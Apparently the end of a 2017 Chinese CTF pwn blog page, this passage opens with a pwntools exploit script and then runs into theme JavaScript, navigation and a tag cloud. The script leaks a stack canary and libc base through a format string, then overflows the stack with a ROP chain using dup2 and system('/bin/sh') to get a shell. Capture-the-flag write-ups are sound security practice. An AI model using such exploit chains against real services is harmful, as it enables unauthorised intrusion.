'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></div><div class="line">    payload = <span class="string">''</span></div><div class="line">    payload += <span class="string">'%138$llx_%158$llx'</span></div><div class="line">    array = dofmt(payload).split(<span class="string">'_'</span>)</div><div class="line">    <span class="keyword">return</span> int(array[<span class="number">0</span>], <span class="number">16</span>), int(array[<span class="number">1</span>], <span class="number">16</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bof_stack</span><span class="params">()</span>:</span></div><div class="line">	dostack()</div><div class="line">	<span class="comment"># buf = 0x410 = 1040</span></div><div class="line">	payload = <span class="string">'a'</span> * <span class="number">0x408</span></div><div class="line">	payload += p64(canary) + p64(<span class="number">1</span>) + p64(pdr) + p64(<span class="number">4</span>) + p64(psr) + p64(<span class="number">0</span>) + p64(dup2)</div><div class="line">	payload += p64(pdr) + p64(<span class="number">4</span>) + p64(psr) + p64(<span class="number">1</span>) + p64(dup2)</div><div class="line">	payload += p64(pdr) + p64(<span class="number">4</span>) + p64(psr) + p64(<span class="number">2</span>) + p64(dup2)</div><div class="line">	payload += p64(pdr) + p64(binsh) + p64(system)</div><div class="line">	payload_length = len(payload) + <span class="number">1</span></div><div class="line">	p.sendline(str(payload_length))</div><div class="line">	p.sendline(payload)</div><div class="line">	log.info(p.recvline())</div><div class="line">	p.interactive()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pdr = <span class="number">0x21102</span> <span class="comment"># pop rdi; ret;</span></div><div class="line">    psr = <span class="number">0x202e8</span> <span class="comment"># pop rsi; ret;</span></div><div class="line"></div><div class="line">    p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">1337</span>)</div><div class="line">    libc = ELF(<span class="string">'libc.so'</span>)</div><div class="line">    canary, libc_addr = leak_libc()</div><div class="line">    libc_base = libc_addr - <span class="number">0x20830</span></div><div class="line">    libc.address = libc_base</div><div class="line">    pdr = libc_base + pdr</div><div class="line">    psr = libc_base + psr</div><div class="line">    system = libc.symbols[<span class="string">'system'</span>]</div><div class="line">    dup2 = libc.symbols[<span class="string">'dup2'</span>]</div><div class="line">    binsh = libc.search(<span class="string">'/bin/sh'</span>).next()</div><div class="line">    bof_stack()</div></pre></td></tr></table></figure>

      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PWN</a>
        		</li>
      		 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2017/02/01/2017Ins/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>








  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/6/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span>
    </nav>
  


          </div>
        </div>
      </div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2017 Ree He
    	</div>
      	<div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      	</div>
    </div>
  </div>
</footer>
    </div>
    <script>
	var yiliaConfig = {
		mathjax: false,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false,
		root: "/",
		innerArchive: true,
		showTags: false
	}
</script>

<script>!function(t){function n(r){if(e[r])return e[r].exports;var o=e[r]={exports:{},id:r,loaded:!1};return t[r].call(o.exports,o,o.exports,n),o.loaded=!0,o.exports}var e={};return n.m=t,n.c=e,n.p="./",n(0)}([function(t,n,e){"use strict";function r(t){return t&&t.__esModule?t:{default:t}}function o(t,n){var e=/\/|index.html/g;return t.replace(e,"")===n.replace(e,"")}function i(){for(var t=document.querySelectorAll(".js-header-menu li a"),n=window.location.pathname,e=0,r=t.length;e<r;e++){var i=t[e];o(n,i.getAttribute("href"))&&(0,d.default)(i,"active")}}function u(t){for(var n=t.offsetLeft,e=t.offsetParent;null!==e;)n+=e.offsetLeft,e=e.offsetParent;return n}function f(t){for(var n=t.offsetTop,e=t.offsetParent;null!==e;)n+=e.offsetTop,e=e.offsetParent;return n}function c(t,n,e,r,o){var i=u(t),c=f(t)-n;if(c-e<=o){var a=t.$newDom;a||(a=t.cloneNode(!0),(0,h.default)(t,a),t.$newDom=a,a.style.position="fixed",a.style.top=(e||c)+"px",a.style.left=i+"px",a.style.zIndex=r||2,a.style.width="100%",a.style.color="#fff"),a.style.visibility="visible",t.style.visibility="hidden"}else{t.style.visibility="visible";var s=t.$newDom;s&&(s.style.visibility="hidden")}}function a(){var t=document.querySelector(".js-overlay"),n=document.querySelector(".js-header-menu");c(t,document.body.scrollTop,-63,2,0),c(n,document.body.scrollTop,1,3,0)}function s(){document.querySelector("#container").addEventListener("scroll",function(t){a()}),window.addEventListener("scroll",function(t){a()}),a()}function l(){x.default.versions.mobile&&window.screen.width<800&&(i(),s())}var p=e(71),d=r(p),v=e(72),y=(r(v),e(84)),h=r(y),b=e(69),x=r(b),m=e(75),g=r(m),w=e(70);l(),(0,w.addLoadEvent)(function(){g.default.init()}),t.exports={}},function(t,n){var e=t.exports="undefined"!=typeof window&&window.Math==Math?window:"undefined"!=typeof self&&self.Math==Math?self:Function("return this")();"number"==typeof __g&&(__g=e)},function(t,n){var e={}.hasOwnProperty;t.exports=function(t,n){return e.call(t,n)}},function(t,n,e){var r=e(49),o=e(15);t.exports=function(t){return r(o(t))}},function(t,n,e){t.exports=!e(8)(function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a})},function(t,n,e){var r=e(6),o=e(12);t.exports=e(4)?function(t,n,e){return r.f(t,n,o(1,e))}:function(t,n,e){return t[n]=e,t}},function(t,n,e){var r=e(10),o=e(30),i=e(24),u=Object.defineProperty;n.f=e(4)?Object.defineProperty:function(t,n,e){if(r(t),n=i(n,!0),r(e),o)try{return u(t,n,e)}catch(t){}if("get"in e||"set"in e)throw TypeError("Accessors not supported!");return"value"in e&&(t[n]=e.value),t}},function(t,n,e){var r=e(22)("wks"),o=e(13),i=e(1).Symbol,u="function"==typeof i,f=t.exports=function(t){return r[t]||(r[t]=u&&i[t]||(u?i:o)("Symbol."+t))};f.store=r},function(t,n){t.exports=function(t){try{return!!t()}catch(t){return!0}}},function(t,n,e){var r=e(35),o=e(16);t.exports=Object.keys||function(t){return r(t,o)}},function(t,n,e){var r=e(11);t.exports=function(t){if(!r(t))throw TypeError(t+" is not an object!");return t}},function(t,n){t.exports=function(t){return"object"==typeof t?null!==t:"function"==typeof t}},function(t,n){t.exports=function(t,n){return{enumerable:!(1&t),configurable:!(2&t),writable:!(4&t),value:n}}},function(t,n){var e=0,r=Math.random();t.exports=function(t){return"Symbol(".concat(void 0===t?"":t,")_",(++e+r).toString(36))}},function(t,n){var e=t.exports={version:"2.4.0"};"number"==typeof __e&&(__e=e)},function(t,n){t.exports=function(t){if(void 0==t)throw TypeError("Can't call method on  "+t);return t}},function(t,n){t.exports="constructor,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf".split(",")},function(t,n){t.exports={}},function(t,n){t.exports=!0},function(t,n){n.f={}.propertyIsEnumerable},function(t,n,e){var r=e(6).f,o=e(2),i=e(7)("toStringTag");t.exports=function(t,n,e){t&&!o(t=e?t:t.prototype,i)&&r(t,i,{configurable:!0,value:n})}},function(t,n,e){var r=e(22)("keys"),o=e(13);t.exports=function(t){return r[t]||(r[t]=o(t))}},function(t,n,e){var r=e(1),o="__core-js_shared__",i=r[o]||(r[o]={});t.exports=function(t){return i[t]||(i[t]={})}},function(t,n){var e=Math.ceil,r=Math.floor;t.exports=function(t){return isNaN(t=+t)?0:(t>0?r:e)(t)}},function(t,n,e){var r=e(11);t.exports=function(t,n){if(!r(t))return t;var e,o;if(n&&"function"==typeof(e=t.toString)&&!r(o=e.call(t)))return o;if("function"==typeof(e=t.valueOf)&&!r(o=e.call(t)))return o;if(!n&&"function"==typeof(e=t.toString)&&!r(o=e.call(t)))return o;throw TypeError("Can't convert object to primitive value")}},function(t,n,e){var r=e(1),o=e(14),i=e(18),u=e(26),f=e(6).f;t.exports=function(t){var n=o.Symbol||(o.Symbol=i?{}:r.Symbol||{});"_"==t.charAt(0)||t in n||f(n,t,{value:u.f(t)})}},function(t,n,e){n.f=e(7)},function(t,n,e){var r=e(1),o=e(14),i=e(46),u=e(5),f="prototype",c=function(t,n,e){var a,s,l,p=t&c.F,d=t&c.G,v=t&c.S,y=t&c.P,h=t&c.B,b=t&c.W,x=d?o:o[n]||(o[n]={}),m=x[f],g=d?r:v?r[n]:(r[n]||{})[f];d&&(e=n);for(a in e)s=!p&&g&&void 0!==g[a],s&&a in x||(l=s?g[a]:e[a],x[a]=d&&"function"!=typeof g[a]?e[a]:h&&s?i(l,r):b&&g[a]==l?function(t){var n=function(n,e,r){if(this instanceof t){switch(arguments.length){case 0:return new t;case 1:return new t(n);case 2:return new t(n,e)}return new t(n,e,r)}return t.apply(this,arguments)};return n[f]=t[f],n}(l):y&&"function"==typeof l?i(Function.call,l):l,y&&((x.virtual||(x.virtual={}))[a]=l,t&c.R&&m&&!m[a]&&u(m,a,l)))};c.F=1,c.G=2,c.S=4,c.P=8,c.B=16,c.W=32,c.U=64,c.R=128,t.exports=c},function(t,n){var e={}.toString;t.exports=function(t){return e.call(t).slice(8,-1)}},function(t,n,e){var r=e(11),o=e(1).document,i=r(o)&&r(o.createElement);t.exports=function(t){return i?o.createElement(t):{}}},function(t,n,e){t.exports=!e(4)&&!e(8)(function(){return 7!=Object.defineProperty(e(29)("div"),"a",{get:function(){return 7}}).a})},function(t,n,e){"use strict";var r=e(18),o=e(27),i=e(36),u=e(5),f=e(2),c=e(17),a=e(51),s=e(20),l=e(58),p=e(7)("iterator"),d=!([].keys&&"next"in[].keys()),v="@@iterator",y="keys",h="values",b=function(){return this};t.exports=function(t,n,e,x,m,g,w){a(e,n,x);var O,S,_,j=function(t){if(!d&&t in A)return A[t];switch(t){case y:return function(){return new e(this,t)};case h:return function(){return new e(this,t)}}return function(){return new e(this,t)}},P=n+" Iterator",E=m==h,M=!1,A=t.prototype,T=A[p]||A[v]||m&&A[m],L=T||j(m),N=m?E?j("entries"):L:void 0,C="Array"==n?A.entries||T:T;if(C&&(_=l(C.call(new t)),_!==Object.prototype&&(s(_,P,!0),r||f(_,p)||u(_,p,b))),E&&T&&T.name!==h&&(M=!0,L=function(){return T.call(this)}),r&&!w||!d&&!M&&A[p]||u(A,p,L),c[n]=L,c[P]=b,m)if(O={values:E?L:j(h),keys:g?L:j(y),entries:N},w)for(S in O)S in A||i(A,S,O[S]);else o(o.P+o.F*(d||M),n,O);return O}},function(t,n,e){var r=e(10),o=e(55),i=e(16),u=e(21)("IE_PROTO"),f=function(){},c="prototype",a=function(){var t,n=e(29)("iframe"),r=i.length,o="<",u=">";for(n.style.display="none",e(48).appendChild(n),n.src="javascript:",t=n.contentWindow.document,t.open(),t.write(o+"script"+u+"document.F=Object"+o+"/script"+u),t.close(),a=t.F;r--;)delete a[c][i[r]];return a()};t.exports=Object.create||function(t,n){var e;return null!==t?(f[c]=r(t),e=new f,f[c]=null,e[u]=t):e=a(),void 0===n?e:o(e,n)}},function(t,n,e){var r=e(35),o=e(16).concat("length","prototype");n.f=Object.getOwnPropertyNames||function(t){return r(t,o)}},function(t,n){n.f=Object.getOwnPropertySymbols},function(t,n,e){var r=e(2),o=e(3),i=e(45)(!1),u=e(21)("IE_PROTO");t.exports=function(t,n){var e,f=o(t),c=0,a=[];for(e in f)e!=u&&r(f,e)&&a.push(e);for(;n.length>c;)r(f,e=n[c++])&&(~i(a,e)||a.push(e));return a}},function(t,n,e){t.exports=e(5)},function(t,n,e){var r=e(15);t.exports=function(t){return Object(r(t))}},function(t,n,e){t.exports={default:e(41),__esModule:!0}},function(t,n,e){t.exports={default:e(42),__esModule:!0}},function(t,n,e){"use strict";function r(t){return t&&t.__esModule?t:{default:t}}n.__esModule=!0;var o=e(39),i=r(o),u=e(38),f=r(u),c="function"==typeof f.default&&"symbol"==typeof i.default?function(t){return typeof t}:function(t){return t&&"function"==typeof f.default&&t.constructor===f.default&&t!==f.default.prototype?"symbol":typeof t};n.default="function"==typeof f.default&&"symbol"===c(i.default)?function(t){return"undefined"==typeof t?"undefined":c(t)}:function(t){return t&&"function"==typeof f.default&&t.constructor===f.default&&t!==f.default.prototype?"symbol":"undefined"==typeof t?"undefined":c(t)}},function(t,n,e){e(65),e(63),e(66),e(67),t.exports=e(14).Symbol},function(t,n,e){e(64),e(68),t.exports=e(26).f("iterator")},function(t,n){t.exports=function(t){if("function"!=typeof t)throw TypeError(t+" is not a function!");return t}},function(t,n){t.exports=function(){}},function(t,n,e){var r=e(3),o=e(61),i=e(60);t.exports=function(t){return function(n,e,u){var f,c=r(n),a=o(c.length),s=i(u,a);if(t&&e!=e){for(;a>s;)if(f=c[s++],f!=f)return!0}else for(;a>s;s++)if((t||s in c)&&c[s]===e)return t||s||0;return!t&&-1}}},function(t,n,e){var r=e(43);t.exports=function(t,n,e){if(r(t),void 0===n)return t;switch(e){case 1:return function(e){return t.call(n,e)};case 2:return function(e,r){return t.call(n,e,r)};case 3:return function(e,r,o){return t.call(n,e,r,o)}}return function(){return t.apply(n,arguments)}}},function(t,n,e){var r=e(9),o=e(34),i=e(19);t.exports=function(t){var n=r(t),e=o.f;if(e)for(var u,f=e(t),c=i.f,a=0;f.length>a;)c.call(t,u=f[a++])&&n.push(u);return n}},function(t,n,e){t.exports=e(1).document&&document.documentElement},function(t,n,e){var r=e(28);t.exports=Object("z").propertyIsEnumerable(0)?Object:function(t){return"String"==r(t)?t.split(""):Object(t)}},function(t,n,e){var r=e(28);t.exports=Array.isArray||function(t){return"Array"==r(t)}},function(t,n,e){"use strict";var r=e(32),o=e(12),i=e(20),u={};e(5)(u,e(7)("iterator"),function(){return this}),t.exports=function(t,n,e){t.prototype=r(u,{next:o(1,e)}),i(t,n+" Iterator")}},function(t,n){t.exports=function(t,n){return{value:n,done:!!t}}},function(t,n,e){var r=e(9),o=e(3);t.exports=function(t,n){for(var e,i=o(t),u=r(i),f=u.length,c=0;f>c;)if(i[e=u[c++]]===n)return e}},function(t,n,e){var r=e(13)("meta"),o=e(11),i=e(2),u=e(6).f,f=0,c=Object.isExtensible||function(){return!0},a=!e(8)(function(){return c(Object.preventExtensions({}))}),s=function(t){u(t,r,{value:{i:"O"+ ++f,w:{}}})},l=function(t,n){if(!o(t))return"symbol"==typeof t?t:("string"==typeof t?"S":"P")+t;if(!i(t,r)){if(!c(t))return"F";if(!n)return"E";s(t)}return t[r].i},p=function(t,n){if(!i(t,r)){if(!c(t))return!0;if(!n)return!1;s(t)}return t[r].w},d=function(t){return a&&v.NEED&&c(t)&&!i(t,r)&&s(t),t},v=t.exports={KEY:r,NEED:!1,fastKey:l,getWeak:p,onFreeze:d}},function(t,n,e){var r=e(6),o=e(10),i=e(9);t.exports=e(4)?Object.defineProperties:function(t,n){o(t);for(var e,u=i(n),f=u.length,c=0;f>c;)r.f(t,e=u[c++],n[e]);return t}},function(t,n,e){var r=e(19),o=e(12),i=e(3),u=e(24),f=e(2),c=e(30),a=Object.getOwnPropertyDescriptor;n.f=e(4)?a:function(t,n){if(t=i(t),n=u(n,!0),c)try{return a(t,n)}catch(t){}if(f(t,n))return o(!r.f.call(t,n),t[n])}},function(t,n,e){var r=e(3),o=e(33).f,i={}.toString,u="object"==typeof window&&window&&Object.getOwnPropertyNames?Object.getOwnPropertyNames(window):[],f=function(t){try{return o(t)}catch(t){return u.slice()}};t.exports.f=function(t){return u&&"[object Window]"==i.call(t)?f(t):o(r(t))}},function(t,n,e){var r=e(2),o=e(37),i=e(21)("IE_PROTO"),u=Object.prototype;t.exports=Object.getPrototypeOf||function(t){return t=o(t),r(t,i)?t[i]:"function"==typeof t.constructor&&t instanceof t.constructor?t.constructor.prototype:t instanceof Object?u:null}},function(t,n,e){var r=e(23),o=e(15);t.exports=function(t){return function(n,e){var i,u,f=String(o(n)),c=r(e),a=f.length;return c<0||c>=a?t?"":void 0:(i=f.charCodeAt(c),i<55296||i>56319||c+1===a||(u=f.charCodeAt(c+1))<56320||u>57343?t?f.charAt(c):i:t?f.slice(c,c+2):(i-55296<<10)+(u-56320)+65536)}}},function(t,n,e){var r=e(23),o=Math.max,i=Math.min;t.exports=function(t,n){return t=r(t),t<0?o(t+n,0):i(t,n)}},function(t,n,e){var r=e(23),o=Math.min;t.exports=function(t){return t>0?o(r(t),9007199254740991):0}},function(t,n,e){"use strict";var r=e(44),o=e(52),i=e(17),u=e(3);t.exports=e(31)(Array,"Array",function(t,n){this._t=u(t),this._i=0,this._k=n},function(){var t=this._t,n=this._k,e=this._i++;return!t||e>=t.length?(this._t=void 0,o(1)):"keys"==n?o(0,e):"values"==n?o(0,t[e]):o(0,[e,t[e]])},"values"),i.Arguments=i.Array,r("keys"),r("values"),r("entries")},function(t,n){},function(t,n,e){"use strict";var r=e(59)(!0);e(31)(String,"String",function(t){this._t=String(t),this._i=0},function(){var t,n=this._t,e=this._i;return e>=n.length?{value:void 0,done:!0}:(t=r(n,e),this._i+=t.length,{value:t,done:!1})})},function(t,n,e){"use strict";var r=e(1),o=e(2),i=e(4),u=e(27),f=e(36),c=e(54).KEY,a=e(8),s=e(22),l=e(20),p=e(13),d=e(7),v=e(26),y=e(25),h=e(53),b=e(47),x=e(50),m=e(10),g=e(3),w=e(24),O=e(12),S=e(32),_=e(57),j=e(56),P=e(6),E=e(9),M=j.f,A=P.f,T=_.f,L=r.Symbol,N=r.JSON,C=N&&N.stringify,k="prototype",F=d("_hidden"),q=d("toPrimitive"),I={}.propertyIsEnumerable,B=s("symbol-registry"),D=s("symbols"),W=s("op-symbols"),H=Object[k],K="function"==typeof L,R=r.QObject,J=!R||!R[k]||!R[k].findChild,U=i&&a(function(){return 7!=S(A({},"a",{get:function(){return A(this,"a",{value:7}).a}})).a})?function(t,n,e){var r=M(H,n);r&&delete H[n],A(t,n,e),r&&t!==H&&A(H,n,r)}:A,G=function(t){var n=D[t]=S(L[k]);return n._k=t,n},$=K&&"symbol"==typeof L.iterator?function(t){return"symbol"==typeof t}:function(t){return t instanceof L},z=function(t,n,e){return t===H&&z(W,n,e),m(t),n=w(n,!0),m(e),o(D,n)?(e.enumerable?(o(t,F)&&t[F][n]&&(t[F][n]=!1),e=S(e,{enumerable:O(0,!1)})):(o(t,F)||A(t,F,O(1,{})),t[F][n]=!0),U(t,n,e)):A(t,n,e)},Y=function(t,n){m(t);for(var e,r=b(n=g(n)),o=0,i=r.length;i>o;)z(t,e=r[o++],n[e]);return t},Q=function(t,n){return void 0===n?S(t):Y(S(t),n)},X=function(t){var n=I.call(this,t=w(t,!0));return!(this===H&&o(D,t)&&!o(W,t))&&(!(n||!o(this,t)||!o(D,t)||o(this,F)&&this[F][t])||n)},V=function(t,n){if(t=g(t),n=w(n,!0),t!==H||!o(D,n)||o(W,n)){var e=M(t,n);return!e||!o(D,n)||o(t,F)&&t[F][n]||(e.enumerable=!0),e}},Z=function(t){for(var n,e=T(g(t)),r=[],i=0;e.length>i;)o(D,n=e[i++])||n==F||n==c||r.push(n);return r},tt=function(t){for(var n,e=t===H,r=T(e?W:g(t)),i=[],u=0;r.length>u;)!o(D,n=r[u++])||e&&!o(H,n)||i.push(D[n]);return i};K||(L=function(){if(this instanceof L)throw TypeError("Symbol is not a constructor!");var t=p(arguments.length>0?arguments[0]:void 0),n=function(e){this===H&&n.call(W,e),o(this,F)&&o(this[F],t)&&(this[F][t]=!1),U(this,t,O(1,e))};return i&&J&&U(H,t,{configurable:!0,set:n}),G(t)},f(L[k],"toString",function(){return this._k}),j.f=V,P.f=z,e(33).f=_.f=Z,e(19).f=X,e(34).f=tt,i&&!e(18)&&f(H,"propertyIsEnumerable",X,!0),v.f=function(t){return G(d(t))}),u(u.G+u.W+u.F*!K,{Symbol:L});for(var nt="hasInstance,isConcatSpreadable,iterator,match,replace,search,species,split,toPrimitive,toStringTag,unscopables".split(","),et=0;nt.length>et;)d(nt[et++]);for(var nt=E(d.store),et=0;nt.length>et;)y(nt[et++]);u(u.S+u.F*!K,"Symbol",{for:function(t){return o(B,t+="")?B[t]:B[t]=L(t)},keyFor:function(t){if($(t))return h(B,t);throw TypeError(t+" is not a symbol!")},useSetter:function(){J=!0},useSimple:function(){J=!1}}),u(u.S+u.F*!K,"Object",{create:Q,defineProperty:z,defineProperties:Y,getOwnPropertyDescriptor:V,getOwnPropertyNames:Z,getOwnPropertySymbols:tt}),N&&u(u.S+u.F*(!K||a(function(){var t=L();return"[null]"!=C([t])||"{}"!=C({a:t})||"{}"!=C(Object(t))})),"JSON",{stringify:function(t){if(void 0!==t&&!$(t)){for(var n,e,r=[t],o=1;arguments.length>o;)r.push(arguments[o++]);return n=r[1],"function"==typeof n&&(e=n),!e&&x(n)||(n=function(t,n){if(e&&(n=e.call(this,t,n)),!$(n))return n}),r[1]=n,C.apply(N,r)}}}),L[k][q]||e(5)(L[k],q,L[k].valueOf),l(L,"Symbol"),l(Math,"Math",!0),l(r.JSON,"JSON",!0)},function(t,n,e){e(25)("asyncIterator")},function(t,n,e){e(25)("observable")},function(t,n,e){e(62);for(var r=e(1),o=e(5),i=e(17),u=e(7)("toStringTag"),f=["NodeList","DOMTokenList","MediaList","StyleSheetList","CSSRuleList"],c=0;c<5;c++){var a=f[c],s=r[a],l=s&&s.prototype;l&&!l[u]&&o(l,u,a),i[a]=i.Array}},function(t,n){"use strict";var e={versions:function(){var t=window.navigator.userAgent;return{trident:t.indexOf("Trident")>-1,presto:t.indexOf("Presto")>-1,webKit:t.indexOf("AppleWebKit")>-1,gecko:t.indexOf("Gecko")>-1&&t.indexOf("KHTML")==-1,mobile:!!t.match(/AppleWebKit.*Mobile.*/),ios:!!t.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),android:t.indexOf("Android")>-1||t.indexOf("Linux")>-1,iPhone:t.indexOf("iPhone")>-1||t.indexOf("Mac")>-1,iPad:t.indexOf("iPad")>-1,webApp:t.indexOf("Safari")==-1,weixin:t.indexOf("MicroMessenger")==-1}}()};t.exports=e},function(t,n,e){"use strict";function r(t){return t&&t.__esModule?t:{default:t}}var o=e(40),i=r(o),u=function(){function t(t,n,e){return n||e?String.fromCharCode(n||e):o[t]||t}function n(t){return l[t]}var e=/&quot;|&lt;|&gt;|&amp;|&nbsp;|&apos;|&#(\d+);|&#(\d+)/g,r=/['<> "&]/g,o={"&quot;":'"',"&lt;":"<","&gt;":">","&amp;":"&","&nbsp;":" "},f=/\u00a0/g,c=/<br\s*\/?>/gi,a=/\r?\n/g,s=/\s/g,l={};for(var p in o)l[o[p]]=p;return o["&apos;"]="'",l["'"]="&#39;",{encode:function(t){return t?(""+t).replace(r,n).replace(a,"<br/>").replace(s,"&nbsp;"):""},decode:function(n){return n?(""+n).replace(c,"\n").replace(e,t).replace(f," "):""},encodeBase16:function(t){if(!t)return t;t+="";for(var n=[],e=0,r=t.length;r>e;e++)n.push(t.charCodeAt(e).toString(16).toUpperCase());return n.join("")},encodeBase16forJSON:function(t){if(!t)return t;t=t.replace(/[\u4E00-\u9FBF]/gi,function(t){return escape(t).replace("%u","\\u")});for(var n=[],e=0,r=t.length;r>e;e++)n.push(t.charCodeAt(e).toString(16).toUpperCase());return n.join("")},decodeBase16:function(t){if(!t)return t;t+="";for(var n=[],e=0,r=t.length;r>e;e+=2)n.push(String.fromCharCode("0x"+t.slice(e,e+2)));return n.join("")},encodeObject:function(t){if(t instanceof Array)for(var n=0,e=t.length;e>n;n++)t[n]=u.encodeObject(t[n]);else if("object"==("undefined"==typeof t?"undefined":(0,i.default)(t)))for(var r in t)t[r]=u.encodeObject(t[r]);else if("string"==typeof t)return u.encode(t);return t},loadScript:function(t){var n=document.createElement("script");document.getElementsByTagName("body")[0].appendChild(n),n.setAttribute("src",t)},addLoadEvent:function(t){var n=window.onload;"function"!=typeof window.onload?window.onload=t:window.onload=function(){n(),t()}}}}();t.exports=u},function(t,n){function e(t,n){t.classList?t.classList.add(n):t.className+=" "+n}t.exports=e},function(t,n){function e(t,n){if(t.classList)t.classList.remove(n);else{var e=new RegExp("(^|\\b)"+n.split(" ").join("|")+"(\\b|$)","gi");t.className=t.className.replace(e," ")}}t.exports=e},,,function(t,n){"use strict";function e(){var t=document.querySelector("#page-nav");if(t&&!document.querySelector("#page-nav .extend.prev")&&(t.innerHTML='<a class="extend prev disabled" rel="prev">&laquo; Prev</a>'+t.innerHTML),t&&!document.querySelector("#page-nav .extend.next")&&(t.innerHTML=t.innerHTML+'<a class="extend next disabled" rel="next">Next &raquo;</a>'),yiliaConfig&&yiliaConfig.open_in_new){var n=document.querySelectorAll(".article-entry a:not(.article-more-a)");n.forEach(function(t){t.setAttribute("target","_blank")})}var e=document.querySelector("#js-aboutme");e&&0!==e.length&&(e.innerHTML=e.innerText)}t.exports={init:e}},,,,,,,,,function(t,n){function e(t,n){if("string"==typeof n)return t.insertAdjacentHTML("afterend",n);var e=t.nextSibling;return e?t.parentNode.insertBefore(n,e):t.parentNode.appendChild(n)}t.exports=e}])</script><script src="/./main.2d7529.js"></script><script>!function(){var e=function(e){var t=document.createElement("script");document.getElementsByTagName("body")[0].appendChild(t),t.setAttribute("src",e)};e("/slider.885efe.js")}()</script>


    
<div class="tools-col" q-class="show:isShow,hide:isShow|isFalse" q-on="click:stop(e)">
  <div class="tools-nav header-menu">
    
    
      
      
      
    
      
      
      
    
      
      
      
    
    

    <ul style="width: 70%">
    
    
      
      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">所有文章</a></li>
      
        
      
      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'friends')"><a href="javascript:void(0)" q-class="active:friends">友链</a></li>
      
        
      
      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'aboutme')"><a href="javascript:void(0)" q-class="active:aboutme">关于我</a></li>
      
        
    </ul>
  </div>
  <div class="tools-wrap">
    
    	<section class="tools-section tools-section-all" q-show="innerArchive">
        <div class="search-wrap">
          <input class="search-ipt" q-model="search" type="text" placeholder="find something…">
          <i class="icon-search icon" q-show="search|isEmptyStr"></i>
          <i class="icon-close icon" q-show="search|isNotEmptyStr" q-on="click:clearChose(e)"></i>
        </div>
        <div class="widget tagcloud search-tag">
          <p class="search-tag-wording">tag:</p>
          <label class="search-switch">
            <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
          </label>
          <ul class="article-tag-list" q-show="showTags">
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">PWN</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color2">pwndbg</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">ida</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">writeup</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">STL</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">CVE</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">Win</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">ML</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">GPLT</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color1">Metasploit</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">PAT</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">POJ</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">sandbox</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">FILE</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">Qt</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color1">C/C++</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">动态规划</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">UVa</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">贪心</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color1">中途相遇法</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">滑动窗口</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color4">构造法</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">heap</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color3">libheap</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color1">stack</a>
              </li>
             
              <li class="article-tag-list-item">
